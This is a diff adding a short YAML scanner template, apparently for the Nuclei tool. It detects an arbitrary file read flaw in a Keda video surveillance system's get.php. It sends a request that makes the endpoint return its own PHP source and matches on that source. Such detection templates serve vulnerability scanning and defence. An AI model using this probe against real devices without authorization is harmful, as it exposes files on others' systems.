@@ -1,0 +1,19 @@
+id: keda-arbitrary-file-read
+info:
+  name: "Keda Video Surveillance get.php 任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: keda
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/get.php?geturl=get.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "$pararl = $_GET['geturl'];"
